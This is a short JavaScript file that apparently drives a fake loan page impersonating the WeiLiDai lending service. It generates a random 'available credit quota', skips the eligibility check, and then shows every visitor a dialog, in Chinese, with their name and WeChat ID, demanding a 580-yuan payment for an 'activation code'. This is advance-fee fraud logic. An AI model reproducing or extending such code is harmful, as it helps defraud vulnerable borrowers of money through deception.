;(function(){

    var Dom = {
        borrow_money:$('#borrow_money'),
    }

    function init(){
        $.app.login.checked();
        getQuota();
    }

    function getQuota(){
        //todo 设置额度 并检测是否可激活
        //额度
        var quota =  $.app.Util.StorageGetter('quota') || Math.random() * 200000 | 0,
            baseEDu = $.app.Util.StorageGetter('base_edu') || 100000; //可激活的额度的标准
        $.app.Util.StorageSetter('quota',quota);
        $('#count').animateNumber({ number: quota});
        $('.total').text(quota);

        var username = $.app.Util.StorageGetter('user_name'),
            wxname = $.app.Util.StorageGetter('wx_name');
            paymoney =  $.app.Util.StorageGetter('pay_money') || 580;

        setTimeout(function(){
            // if(quota > baseEDu ){ //可激活
                $.DialogByZ.Confirm({Title: "", Content: '姓名：'+ username +'，微信号：'+ wxname +'，成功检测可用额度'+ quota +'，如果激活开通，需要支付'+paymoney+'元获取激活码！激活开通后，微信钱包中显示微粒贷借钱图标，即可成功借款！',BtnL:"取消",BtnR:"确定",FunL:cancelAct,FunR:sureActive})
            // }
        },1500);
    }

    function EventHandler(){
        //  TODO  事件

        Dom.borrow_money.click(function(){

        });
    }

    //弹框

    function cancelAct(){
        $.DialogByZ.Close();
    }
    function sureActive(){
        $.DialogByZ.Close();
    }

    init();


})();
